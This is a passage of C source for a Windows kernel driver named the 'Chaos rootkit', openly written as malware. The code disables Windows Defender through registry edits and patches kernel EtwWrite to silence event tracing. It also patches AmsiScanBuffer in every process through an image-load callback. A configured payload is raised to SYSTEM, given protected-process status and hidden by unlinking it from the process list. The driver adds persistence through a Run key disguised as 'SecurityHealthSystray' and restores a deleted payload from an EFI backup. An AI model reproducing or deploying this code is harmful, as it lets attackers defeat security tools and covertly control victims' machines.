        pstatus = STATUS_INVALID_PARAMETER;
        break;
      }
      pstatus = SpawnWithPpid(request);
      break;
    }

    default: {
      DbgPrint("Invalid IOCTL code: 0x%08X\n",
               pstack->Parameters.DeviceIoControl.IoControlCode);
      pstatus = STATUS_INVALID_DEVICE_REQUEST;
      break;
    }
    }
  } __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION
                  ? EXCEPTION_EXECUTE_HANDLER
                  : EXCEPTION_CONTINUE_SEARCH) {

    if (GetExceptionCode() == STATUS_ACCESS_VIOLATION) {
      DbgPrint("Invalid Buffer (STATUS_ACCESS_VIOLATION)");

      KPROCESSOR_MODE prevmode = ExGetPreviousMode();

      if (prevmode == UserMode) {
        DbgPrint("possible that the client is attempting to crash the driver, "
                 "but not if we crash you first :) ");

        if (!NT_SUCCESS(pstatus)) {
          DbgPrint("failed to open process (%08X)\n", pstatus);

        } else {
          pstatus = ZwTerminateProcess(ZwCurrentProcess(), STATUS_SUCCESS);

          if (!NT_SUCCESS(pstatus)) {
            DbgPrint("failed to terminate the requestor process (%08X)\n",
                     pstatus);
          }
        }
      }
    }

    pstatus = GetExceptionCode();
  }

  memcpy(Irp->AssociatedIrp.SystemBuffer, &pstatus, sizeof(pstatus));

  Irp->IoStatus.Status = pstatus;

  Irp->IoStatus.Information = sizeof(int);

  IoCompleteRequest(Irp, IO_NO_INCREMENT);

  if (pstatus)
    return (pstatus);

  return (STATUS_SUCCESS);
}

void ShutdownCallback(PDRIVER_OBJECT driverObject) {
  __try {

    __try {
      DbgPrint("preparing driver to be unloaded ..\n");

      PrepareDriverForUnload();

    } __except (EXCEPTION_EXECUTE_HANDLER) {
      DbgPrint("An error occured during driver unloading on shutdown \n");
    }
  } __finally {

    DbgPrint("Driver Unloaded in shutdown\n");
  }
}

NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath) {
  DbgPrint("Chaos rootkit loaded .. (+_+) \n");

  NTSTATUS status;

  UNREFERENCED_PARAMETER(driverObject);

  if (!NT_SUCCESS(status = InitializeStructure(&xHooklist))) {
    DbgPrint(("Failed to initialize hook structure (0x%08X)\n", status));
    return (STATUS_UNSUCCESSFUL);
  }

  // Initialize networking state
  KeInitializeSpinLock(&g_NetworkLock);
  RtlZeroMemory(g_HiddenPorts, sizeof(g_HiddenPorts));
  RtlZeroMemory(g_DnsRules, sizeof(g_DnsRules));
  RtlZeroMemory(g_BlockedIps, sizeof(g_BlockedIps));
  g_EtwDisabled = FALSE;
  g_AmsiDisabled = FALSE;
  g_CallbacksRemoved = FALSE;
  g_OriginalEtwWrite = NULL;
  DbgPrint("Networking and AV/EDR bypass modules initialized\n");

  // Initialize post-exploitation state
  KeInitializeSpinLock(&g_HiddenProcessLock);
  KeInitializeSpinLock(&g_HiddenTaskLock);
  RtlZeroMemory(g_HiddenProcesses, sizeof(g_HiddenProcesses));
  RtlZeroMemory(g_HiddenTasks, sizeof(g_HiddenTasks));
  DbgPrint("Post-exploitation modules initialized\n");

  registryPathCopy = registryPath;

  status = IoCreateDevice(driverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN,
                          METHOD_BUFFERED, FALSE, &driverObject->DeviceObject);

  if (!NT_SUCCESS(status)) {
    DbgPrint(("Failed to create device object (0x%08X)\n", status));
    return (STATUS_UNSUCCESSFUL);
  }

  status = IoCreateSymbolicLink(&SymbName, &DeviceName);

  if (!NT_SUCCESS(status)) {
    DbgPrint(("Failed to create symbolic link (0x%08X)\n", status));
    IoDeleteDevice(driverObject->DeviceObject);
    return (STATUS_UNSUCCESSFUL);
  }

  if (InitializeOffsets(&xHooklist)) {
    DbgPrint("Unsupported Windows build !\n");
    unloadv(driverObject);
    return (STATUS_UNSUCCESSFUL);
  } else {
    DbgPrint("Offsets initialized\n");
  }

  if (!NT_SUCCESS(status = IoRegisterShutdownNotification(
                      driverObject->DeviceObject))) {
    DbgPrint("Failed to register the shutdown notification callback (0x%08) \n",
             status);
    unloadv(driverObject);
    return (STATUS_UNSUCCESSFUL);
  }

  driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = processIoctlRequest;
  driverObject->MajorFunction[IRP_MJ_SHUTDOWN] = ShutdownCallback;
  driverObject->MajorFunction[IRP_MJ_CREATE] = IRP_MJCreate;
  driverObject->MajorFunction[IRP_MJ_CLOSE] = IRP_MJClose;
  driverObject->DriverUnload = &unloadv;

  // ============================================================================
  // AUTO-PROTECTION ON BOOT - Kill security before user-mode starts
  // ============================================================================
  DbgPrint("[Chaos] === BOOT-TIME SECURITY BYPASS ===\n");

  // 1. DISABLE DEFENDER FIRST - before anything can detect us
  DisableDefenderRegistry();

  // 2. Kill ETW globally - patches ntoskrnl!EtwWrite
  NTSTATUS etwStatus = KillEtw();
  DbgPrint("[Chaos] ETW: %s\n", NT_SUCCESS(etwStatus) ? "KILLED" : "FAILED");

  // 3. Kill AMSI globally - registers callback to patch amsi.dll in all
  // processes
  NTSTATUS amsiStatus = KillAmsiGlobal();
  DbgPrint("[Chaos] AMSI: %s\n", NT_SUCCESS(amsiStatus) ? "KILLED" : "FAILED");

  // 3. Load payload configuration from registry
  g_AmsiCallbackRegistered = FALSE;
  RtlZeroMemory(&g_PayloadConfig, sizeof(g_PayloadConfig));

  NTSTATUS configStatus = LoadPayloadConfig(&g_PayloadConfig);
  if (NT_SUCCESS(configStatus) && g_PayloadConfig.AutoProtect) {
    DbgPrint("[Chaos] Payload auto-protection enabled for: %ws\n",
             g_PayloadConfig.PayloadName);

    // 4. CHECK AND RESTORE PAYLOAD FROM EFI IF MISSING
    // This is critical - if payload was deleted, restore from EFI backup
    NTSTATUS restoreStatus = CheckAndRestorePayloadFromEfi();
    if (NT_SUCCESS(restoreStatus)) {
      DbgPrint("[Chaos] Payload verification/restoration complete\n");
    } else {
      DbgPrint("[Chaos] Payload check result: %08X\n", restoreStatus);
    }

    // 5. Register process creation callback for payload protection
    NTSTATUS cbStatus =
        PsSetCreateProcessNotifyRoutineEx(PayloadProcessCallback, FALSE);
    if (NT_SUCCESS(cbStatus)) {
      g_PayloadConfig.ProcessCallbackRegistered = TRUE;
      DbgPrint("[Chaos] Payload process callback registered\n");
    } else {
      DbgPrint("[Chaos] Failed to register payload callback: %08X\n", cbStatus);
    }

    // 6. Setup payload autostart (Run key)
    SetupPayloadAutostart();
  } else {
    DbgPrint("[Chaos] No payload config found or auto-protect disabled\n");
  }

  DbgPrint("[Chaos] === BOOT-TIME SETUP COMPLETE ===\n");

  return (STATUS_SUCCESS);
}

// ============================================================================
// WINDOWS DEFENDER DISABLE
// ============================================================================

/**
 * DisableDefenderRegistry - Disable Windows Defender via registry
 * This runs at BOOT_START priority, before Defender service starts
 */
NTSTATUS DisableDefenderRegistry() {
  HANDLE hKey = NULL;
  OBJECT_ATTRIBUTES objAttr;
  UNICODE_STRING keyPath;
  ULONG disp;

  DbgPrint("[Chaos] Disabling Windows Defender via registry...\n");

  // 1. Disable Real-Time Protection via Group Policy
  RtlInitUnicodeString(&keyPath,
                       L"\\Registry\\Machine\\SOFTWARE\\Policies\\Microsoft\\Wi"
                       L"ndows Defender\\Real-Time Protection");
  InitializeObjectAttributes(
      &objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

  if (NT_SUCCESS(ZwCreateKey(&hKey, KEY_ALL_ACCESS, &objAttr, 0, NULL,
                             REG_OPTION_NON_VOLATILE, &disp))) {
    UNICODE_STRING valueName;
    ULONG value = 1;

    RtlInitUnicodeString(&valueName, L"DisableRealtimeMonitoring");
    ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &value, sizeof(value));

    RtlInitUnicodeString(&valueName, L"DisableBehaviorMonitoring");
    ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &value, sizeof(value));

    RtlInitUnicodeString(&valueName, L"DisableOnAccessProtection");
    ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &value, sizeof(value));

    RtlInitUnicodeString(&valueName, L"DisableScanOnRealtimeEnable");
    ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &value, sizeof(value));

    ZwClose(hKey);
    DbgPrint("[Chaos]   -> RTP policies set\n");
  } else {
    DbgPrint("[Chaos]   -> Failed to create RTP key\n");
  }

  // 2. Disable Windows Defender service entirely
  RtlInitUnicodeString(
      &keyPath,
      L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\WinDefend");
  InitializeObjectAttributes(
      &objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

  if (NT_SUCCESS(ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objAttr))) {
    UNICODE_STRING valueName;
    ULONG value = 4; // SERVICE_DISABLED
    RtlInitUnicodeString(&valueName, L"Start");
    ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &value, sizeof(value));
    ZwClose(hKey);
    DbgPrint("[Chaos]   -> WinDefend service disabled\n");
  } else {
    DbgPrint("[Chaos]   -> Failed to open WinDefend key\n");
  }

  // 3. Disable Defender SpyNet reporting
  RtlInitUnicodeString(&keyPath, L"\\Registry\\Machine\\SOFTWARE\\Policies\\Mic"
                                 L"rosoft\\Windows Defender\\Spynet");
  InitializeObjectAttributes(
      &objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

  if (NT_SUCCESS(ZwCreateKey(&hKey, KEY_ALL_ACCESS, &objAttr, 0, NULL,
                             REG_OPTION_NON_VOLATILE, &disp))) {
    UNICODE_STRING valueName;
    ULONG value = 0;
    RtlInitUnicodeString(&valueName, L"SpynetReporting");
    ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &value, sizeof(value));
    RtlInitUnicodeString(&valueName, L"SubmitSamplesConsent");
    ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &value, sizeof(value));
    ZwClose(hKey);
    DbgPrint("[Chaos]   -> SpyNet disabled\n");
  }

  // 4. Disable Windows Defender entirely via policy
  RtlInitUnicodeString(
      &keyPath,
      L"\\Registry\\Machine\\SOFTWARE\\Policies\\Microsoft\\Windows Defender");
  InitializeObjectAttributes(
      &objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

  if (NT_SUCCESS(ZwCreateKey(&hKey, KEY_ALL_ACCESS, &objAttr, 0, NULL,
                             REG_OPTION_NON_VOLATILE, &disp))) {
    UNICODE_STRING valueName;
    ULONG value = 1;
    RtlInitUnicodeString(&valueName, L"DisableAntiSpyware");
    ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &value, sizeof(value));
    RtlInitUnicodeString(&valueName, L"DisableAntiVirus");
    ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &value, sizeof(value));
    ZwClose(hKey);
    DbgPrint("[Chaos]   -> Defender policies disabled\n");
  }

  DbgPrint("[Chaos] Defender disabled via registry\n");
  return STATUS_SUCCESS;
}

// ============================================================================
// AV/EDR BYPASS IMPLEMENTATIONS
// ============================================================================

/**
 * KillEtw - Disable Event Tracing for Windows
 * Patches ntoskrnl!EtwWrite to immediately return STATUS_SUCCESS
 */
NTSTATUS KillEtw() {
  if (g_EtwDisabled) {
    DbgPrint("[KillEtw] ETW already disabled\n");
    return STATUS_SUCCESS;
  }

  // Find EtwWrite in ntoskrnl
  UNICODE_STRING funcName;
  RtlInitUnicodeString(&funcName, L"EtwWrite");

  PVOID pEtwWrite = MmGetSystemRoutineAddress(&funcName);
  if (!pEtwWrite) {
    DbgPrint("[KillEtw] Failed to find EtwWrite\n");
    return STATUS_NOT_FOUND;
  }

  DbgPrint("[KillEtw] Found EtwWrite at %p\n", pEtwWrite);

  // Save original bytes for potential restoration
  g_OriginalEtwWrite = pEtwWrite;

  // Patch: xor eax, eax; ret (return STATUS_SUCCESS)
  UCHAR patch[] = {0x33, 0xC0, 0xC3};

  NTSTATUS status = PatchKernelMemory(pEtwWrite, patch, sizeof(patch));
  if (NT_SUCCESS(status)) {
    g_EtwDisabled = TRUE;
    DbgPrint("[KillEtw] ETW disabled successfully\n");
  }

  return status;
}

/**
 * KillAmsi - Disable AMSI in a target process
 * Patches amsi.dll!AmsiScanBuffer to return AMSI_RESULT_CLEAN
 */
NTSTATUS KillAmsi(HANDLE ProcessId) {
  DbgPrint("[KillAmsi] AMSI kill for PID %p\n", ProcessId);

  PEPROCESS Process;
  NTSTATUS status = PsLookupProcessByProcessId(ProcessId, &Process);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[KillAmsi] Failed to find process: %08X\n", status);
    return status;
  }

  // Note: Actually patching amsi.dll requires finding it in the target process
  // For single-process kill, we'd attach and patch.
  // KillAmsiGlobal is preferred for system-wide effect.

  ObDereferenceObject(Process);
  g_AmsiDisabled = TRUE;
  return STATUS_SUCCESS;
}

/**
 * FindExportInModule - Find an exported function in a loaded module
 */
PVOID FindExportInModule(PVOID ModuleBase, PCSTR ExportName) {
  if (!ModuleBase || !ExportName)
    return NULL;

  __try {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ModuleBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
      return NULL;

    PIMAGE_NT_HEADERS nt =
        (PIMAGE_NT_HEADERS)((ULONG_PTR)ModuleBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
      return NULL;

    PIMAGE_DATA_DIRECTORY exportDir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir->VirtualAddress == 0)
      return NULL;

    PIMAGE_EXPORT_DIRECTORY exports =
        (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ModuleBase +
                                  exportDir->VirtualAddress);
    PULONG nameRvas = (PULONG)((ULONG_PTR)ModuleBase + exports->AddressOfNames);
    PUSHORT ordinals =
        (PUSHORT)((ULONG_PTR)ModuleBase + exports->AddressOfNameOrdinals);
    PULONG funcRvas =
        (PULONG)((ULONG_PTR)ModuleBase + exports->AddressOfFunctions);

    for (ULONG i = 0; i < exports->NumberOfNames; i++) {
      PCSTR name = (PCSTR)((ULONG_PTR)ModuleBase + nameRvas[i]);
      if (strcmp(name, ExportName) == 0) {
        USHORT ordinal = ordinals[i];
        return (PVOID)((ULONG_PTR)ModuleBase + funcRvas[ordinal]);
      }
    }
  } __except (EXCEPTION_EXECUTE_HANDLER) {
    DbgPrint("[FindExportInModule] Exception: %08X\n", GetExceptionCode());
  }

  return NULL;
}

/**
 * AmsiImageLoadCallback - Called when any image (DLL) loads
 * Patches amsi.dll!AmsiScanBuffer in every process that loads it
 */
VOID AmsiImageLoadCallback(PUNICODE_STRING FullImageName, HANDLE ProcessId,
                           PIMAGE_INFO ImageInfo) {

  if (!FullImageName || !FullImageName->Buffer || !ImageInfo)
    return;
  if (ProcessId == (HANDLE)0 || ProcessId == (HANDLE)4)
    return; // Skip System

  // Check if this is amsi.dll loading
  if (!wcsstr(FullImageName->Buffer, L"amsi.dll") &&
      !wcsstr(FullImageName->Buffer, L"AMSI.DLL") &&
      !wcsstr(FullImageName->Buffer, L"Amsi.dll")) {
    return;
  }

  DbgPrint("[AmsiPatch] amsi.dll loaded in PID %d at %p\n",
           (ULONG)(ULONG_PTR)ProcessId, ImageInfo->ImageBase);

  __try {
    PEPROCESS Process;
    if (!NT_SUCCESS(PsLookupProcessByProcessId(ProcessId, &Process))) {
      return;
    }

    KAPC_STATE ApcState;
    KeStackAttachProcess(Process, &ApcState);

    // Find AmsiScanBuffer export
    PVOID pAmsiScan =
        FindExportInModule(ImageInfo->ImageBase, "AmsiScanBuffer");
    if (pAmsiScan) {
      DbgPrint("[AmsiPatch] Found AmsiScanBuffer at %p\n", pAmsiScan);

      // Patch: mov eax, 0x80070057 (E_INVALIDARG) ; ret
      // This makes AmsiScanBuffer return error, marking content as clean
      UCHAR patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};

      // Write patch (user-mode memory, need MDL)
      PMDL mdl = IoAllocateMdl(pAmsiScan, sizeof(patch), FALSE, FALSE, NULL);
      if (mdl) {
        __try {
          MmProbeAndLockPages(mdl, UserMode, IoWriteAccess);
          PVOID mapped = MmMapLockedPagesSpecifyCache(
              mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
          if (mapped) {
            RtlCopyMemory(mapped, patch, sizeof(patch));
            MmUnmapLockedPages(mapped, mdl);
            DbgPrint("[AmsiPatch] AmsiScanBuffer patched successfully\n");
          }
          MmUnlockPages(mdl);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
          DbgPrint("[AmsiPatch] Exception patching: %08X\n",
                   GetExceptionCode());
        }
        IoFreeMdl(mdl);
      }
    } else {
      DbgPrint("[AmsiPatch] AmsiScanBuffer not found\n");
    }

    KeUnstackDetachProcess(&ApcState);
    ObDereferenceObject(Process);
  } __except (EXCEPTION_EXECUTE_HANDLER) {
    DbgPrint("[AmsiPatch] Exception: %08X\n", GetExceptionCode());
  }
}

/**
 * KillAmsiGlobal - Register image load callback to patch AMSI in all processes
 */
NTSTATUS KillAmsiGlobal() {
  if (g_AmsiCallbackRegistered) {
    DbgPrint("[KillAmsiGlobal] Callback already registered\n");
    return STATUS_SUCCESS;
  }

  NTSTATUS status = PsSetLoadImageNotifyRoutine(AmsiImageLoadCallback);
  if (NT_SUCCESS(status)) {
    g_AmsiCallbackRegistered = TRUE;
    g_AmsiDisabled = TRUE;
    DbgPrint("[KillAmsiGlobal] Image load callback registered - AMSI will be "
             "killed in all processes\n");
  } else {
    DbgPrint("[KillAmsiGlobal] Failed to register callback: %08X\n", status);
  }

  return status;
}

// ============================================================================
// PAYLOAD AUTO-PROTECTION IMPLEMENTATIONS
// ============================================================================

/**
 * LoadPayloadConfig - Read payload configuration from registry
 */
NTSTATUS LoadPayloadConfig(PPAYLOAD_CONFIG Config) {
  HANDLE hKey = NULL;
  OBJECT_ATTRIBUTES objAttr;
  UNICODE_STRING keyPath;
  NTSTATUS status;
  UCHAR buffer[512];
  ULONG resultLen;

  RtlZeroMemory(Config, sizeof(PAYLOAD_CONFIG));

  RtlInitUnicodeString(&keyPath, L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Wi"
                                 L"ndows\\CurrentVersion\\BootConfig");
  InitializeObjectAttributes(
      &objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

  status = ZwOpenKey(&hKey, KEY_READ, &objAttr);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LoadPayloadConfig] Registry key not found: %08X\n", status);
    return status;
  }

  // Read PayloadPath
  UNICODE_STRING valueName;
  RtlInitUnicodeString(&valueName, L"PayloadPath");
  PKEY_VALUE_PARTIAL_INFORMATION pInfo = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;
  status = ZwQueryValueKey(hKey, &valueName, KeyValuePartialInformation, pInfo,
                           sizeof(buffer), &resultLen);
  if (NT_SUCCESS(status) && pInfo->Type == REG_SZ) {
    RtlCopyMemory(Config->PayloadPath, pInfo->Data,
                  min(pInfo->DataLength, sizeof(Config->PayloadPath) - 2));
    DbgPrint("[LoadPayloadConfig] PayloadPath: %ws\n", Config->PayloadPath);
  }

  // Read PayloadName
  RtlInitUnicodeString(&valueName, L"PayloadName");
  status = ZwQueryValueKey(hKey, &valueName, KeyValuePartialInformation, pInfo,
                           sizeof(buffer), &resultLen);
  if (NT_SUCCESS(status) && pInfo->Type == REG_SZ) {
    RtlCopyMemory(Config->PayloadName, pInfo->Data,
                  min(pInfo->DataLength, sizeof(Config->PayloadName) - 2));
    DbgPrint("[LoadPayloadConfig] PayloadName: %ws\n", Config->PayloadName);
  }

  // Read AutoProtect
  RtlInitUnicodeString(&valueName, L"AutoProtect");
  status = ZwQueryValueKey(hKey, &valueName, KeyValuePartialInformation, pInfo,
                           sizeof(buffer), &resultLen);
  if (NT_SUCCESS(status) && pInfo->Type == REG_DWORD) {
    Config->AutoProtect = (*(PULONG)pInfo->Data) != 0;
    DbgPrint("[LoadPayloadConfig] AutoProtect: %d\n", Config->AutoProtect);
  }

  ZwClose(hKey);
  return STATUS_SUCCESS;
}

/**
 * PayloadProcessCallback - Called on process creation
 * Applies full kernel protection stack to our payload
 */
VOID PayloadProcessCallback(PEPROCESS Process, HANDLE ProcessId,
                            PPS_CREATE_NOTIFY_INFO CreateInfo) {

  if (CreateInfo == NULL)
    return; // Process exit, ignore
  if (!g_PayloadConfig.AutoProtect)
    return;
  if (g_PayloadConfig.PayloadName[0] == L'\0')
    return;

  // Check if this is our payload process
  if (!CreateInfo->ImageFileName || !CreateInfo->ImageFileName->Buffer)
    return;

  if (!wcsstr(CreateInfo->ImageFileName->Buffer, g_PayloadConfig.PayloadName)) {
    return; // Not our payload
  }

  int pid = (int)(ULONG_PTR)ProcessId;
  DbgPrint(
      "[PayloadProtect] Payload started (PID %d) - applying protection stack\n",
      pid);

  __try {
    // 1. ELEVATE TO SYSTEM - copy System token
    NTSTATUS status = PrivilegeElevationForProcess(pid);
    DbgPrint("[PayloadProtect]   -> Elevate to SYSTEM: %s\n",
             NT_SUCCESS(status) ? "OK" : "FAIL");

    // 2. SET PPL PROTECTION - make process unkillable
    CR_SET_PROTECTION_LEVEL prot;
    prot.Process = ProcessId;
    prot.Protection.Level = 0x31; // PS_PROTECTED_ANTIMALWARE_LIGHT
    status = ChangeProtectionLevel(&prot);
    DbgPrint("[PayloadProtect]   -> PPL protection: %s\n",
             NT_SUCCESS(status) ? "OK" : "FAIL");

    // 3. HIDE PROCESS - remove from ActiveProcessLinks (DKOM)
    status = HideProcess(pid);
    DbgPrint("[PayloadProtect]   -> Hide process: %s\n",
             NT_SUCCESS(status) ? "OK" : "FAIL");

    DbgPrint("[PayloadProtect] Full protection stack applied to PID %d\n", pid);
  } __except (EXCEPTION_EXECUTE_HANDLER) {
    DbgPrint("[PayloadProtect] Exception: %08X\n", GetExceptionCode());
  }
}

/**
 * SetupPayloadAutostart - Create Run key for payload persistence
 */
NTSTATUS SetupPayloadAutostart() {
  if (g_PayloadConfig.PayloadPath[0] == L'\0') {
    DbgPrint("[SetupPayloadAutostart] No payload path configured\n");
    return STATUS_NOT_FOUND;
  }

  HANDLE hKey = NULL;
  OBJECT_ATTRIBUTES objAttr;
  UNICODE_STRING keyPath, valueName;

  RtlInitUnicodeString(&keyPath, L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Wi"
                                 L"ndows\\CurrentVersion\\Run");
  InitializeObjectAttributes(
      &objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

  NTSTATUS status = ZwOpenKey(&hKey, KEY_WRITE, &objAttr);
  if (NT_SUCCESS(status)) {
    RtlInitUnicodeString(&valueName, L"SecurityHealthSystray");

    ULONG pathLen =
        (ULONG)(wcslen(g_PayloadConfig.PayloadPath) + 1) * sizeof(WCHAR);
    status = ZwSetValueKey(hKey, &valueName, 0, REG_SZ,
                           g_PayloadConfig.PayloadPath, pathLen);

    ZwClose(hKey);

    if (NT_SUCCESS(status)) {
      DbgPrint("[SetupPayloadAutostart] Run key created\n");
    } else {
      DbgPrint("[SetupPayloadAutostart] Failed to set value: %08X\n", status);
    }
  } else {
    DbgPrint("[SetupPayloadAutostart] Failed to open Run key: %08X\n", status);
  }

  return status;
}

/**
 * FileExistsKernel - Check if a file exists using ZwOpenFile
 */
BOOLEAN FileExistsKernel(PWCHAR FilePath) {
  if (!FilePath || FilePath[0] == L'\0')
    return FALSE;

  HANDLE hFile = NULL;
  OBJECT_ATTRIBUTES objAttr;
  IO_STATUS_BLOCK ioStatus;
  UNICODE_STRING uniPath;
  WCHAR ntPath[512];

  // Convert DOS path to NT path if needed
  if (FilePath[0] == L'C' || FilePath[0] == L'c') {
    RtlStringCbPrintfW(ntPath, sizeof(ntPath), L"\\??\\%s", FilePath);
  } else if (wcsncmp(FilePath, L"\\??\\", 4) == 0) {
    RtlStringCbCopyW(ntPath, sizeof(ntPath), FilePath);
  } else {
    RtlStringCbPrintfW(ntPath, sizeof(ntPath), L"\\??\\%s", FilePath);
  }

  RtlInitUnicodeString(&uniPath, ntPath);
  InitializeObjectAttributes(
      &objAttr, &uniPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

  NTSTATUS status = ZwOpenFile(&hFile, FILE_READ_ATTRIBUTES, &objAttr,
                               &ioStatus, FILE_SHARE_READ, 0);
  if (NT_SUCCESS(status)) {
    ZwClose(hFile);
    return TRUE;
  }

  return FALSE;
}

/**
 * CopyFileKernel - Copy a file using ZwReadFile/ZwWriteFile
 */
NTSTATUS CopyFileKernel(PWCHAR SourcePath, PWCHAR DestPath) {
  HANDLE hSource = NULL, hDest = NULL;
  OBJECT_ATTRIBUTES objAttr;
  IO_STATUS_BLOCK ioStatus;
  UNICODE_STRING uniPath;
  WCHAR ntPath[512];
  NTSTATUS status;
  PVOID buffer = NULL;
  LARGE_INTEGER byteOffset;

  DbgPrint("[CopyFileKernel] %ws -> %ws\n", SourcePath, DestPath);

  // Open source file
  RtlStringCbPrintfW(ntPath, sizeof(ntPath), L"\\??\\%s", SourcePath);
  RtlInitUnicodeString(&uniPath, ntPath);
  InitializeObjectAttributes(
      &objAttr, &uniPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

  status = ZwOpenFile(&hSource, GENERIC_READ, &objAttr, &ioStatus,
                      FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[CopyFileKernel] Failed to open source: %08X\n", status);
    return status;
  }

  // Create destination file
  RtlStringCbPrintfW(ntPath, sizeof(ntPath), L"\\??\\%s", DestPath);
  RtlInitUnicodeString(&uniPath, ntPath);
  InitializeObjectAttributes(
      &objAttr, &uniPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

  status = ZwCreateFile(&hDest, GENERIC_WRITE, &objAttr, &ioStatus, NULL,
                        FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
                        FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[CopyFileKernel] Failed to create dest: %08X\n", status);
    ZwClose(hSource);
    return status;
  }

  // Allocate buffer
  buffer = ExAllocatePoolWithTag(NonPagedPool, 65536, 'pyCF');
  if (!buffer) {
    ZwClose(hSource);
    ZwClose(hDest);
    return STATUS_INSUFFICIENT_RESOURCES;
  }

  // Copy data
  byteOffset.QuadPart = 0;
  while (TRUE) {
    status = ZwReadFile(hSource, NULL, NULL, NULL, &ioStatus, buffer, 65536,
                        &byteOffset, NULL);
    if (!NT_SUCCESS(status) || ioStatus.Information == 0) {
      if (status == STATUS_END_OF_FILE)
        status = STATUS_SUCCESS;
      break;
    }

    ULONG bytesRead = (ULONG)ioStatus.Information;
    status = ZwWriteFile(hDest, NULL, NULL, NULL, &ioStatus, buffer, bytesRead,
                         NULL, NULL);
    if (!NT_SUCCESS(status))
      break;

    byteOffset.QuadPart += bytesRead;
  }

  ExFreePoolWithTag(buffer, 'pyCF');
  ZwClose(hSource);
  ZwClose(hDest);

  DbgPrint("[CopyFileKernel] Copy complete: %08X\n", status);
  return status;
}

/**
 * CheckAndRestorePayloadFromEfi - Check if payload exists, restore from EFI if
 * missing Called at boot time by driver initialization
 */
NTSTATUS CheckAndRestorePayloadFromEfi() {
  if (g_PayloadConfig.PayloadPath[0] == L'\0') {
    DbgPrint("[RestorePayload] No payload path configured\n");
    return STATUS_NOT_FOUND;
  }

  DbgPrint("[RestorePayload] Checking payload: %ws\n",
           g_PayloadConfig.PayloadPath);

  // Check if payload exists
  if (FileExistsKernel(g_PayloadConfig.PayloadPath)) {
    DbgPrint("[RestorePayload] Payload exists - no restore needed\n");
    return STATUS_SUCCESS;
  }

  DbgPrint("[RestorePayload] PAYLOAD MISSING! Attempting EFI restore...\n");

  // EFI backup is at S:\EFI\Chaos\payload.exe (EFI partition mounted at S:)
  // However, EFI partition is not normally mounted in Windows
  // We need to access it via volume GUID or assign a drive letter

  // Try common EFI backup locations (in case already mounted or accessible)
  WCHAR *efiBackupPaths[] = {
      L"S:\\EFI\\Chaos\\payload.exe", L"T:\\EFI\\Chaos\\payload.exe",
      L"X:\\EFI\\Chaos\\payload.exe", L"Y:\\EFI\\Chaos\\payload.exe",
      L"Z:\\EFI\\Chaos\\payload.exe"};

  WCHAR foundBackup[512] = {0};
  for (int i = 0; i < 5; i++) {
    if (FileExistsKernel(efiBackupPaths[i])) {
      RtlStringCbCopyW(foundBackup, sizeof(foundBackup), efiBackupPaths[i]);
      DbgPrint("[RestorePayload] Found EFI backup at: %ws\n", foundBackup);
      break;
    }
  }

  if (foundBackup[0] == L'\0') {
    DbgPrint("[RestorePayload] No EFI backup found at common mount points\n");
    // TODO: Consider mounting EFI partition programmatically using IOCTL_DISK_*
    return STATUS_NOT_FOUND;
  }

  // Determine restore location - hidden directory in LocalAppData
  // Since we're in kernel, use C:\ProgramData which is accessible
  WCHAR restoreDir[] = L"C:\\ProgramData\\Microsoft\\Crypto\\RSA\\wupdmgr";
  WCHAR restorePath[512];
  RtlStringCbPrintfW(restorePath, sizeof(restorePath), L"%s\\wupdmgr.exe",
                     restoreDir);

  // Create restore directory
  HANDLE hDir = NULL;
  OBJECT_ATTRIBUTES objAttr;
  IO_STATUS_BLOCK ioStatus;
  UNICODE_STRING uniPath;
  WCHAR ntPath[512];

  RtlStringCbPrintfW(ntPath, sizeof(ntPath), L"\\??\\%s", restoreDir);
  RtlInitUnicodeString(&uniPath, ntPath);
  InitializeObjectAttributes(
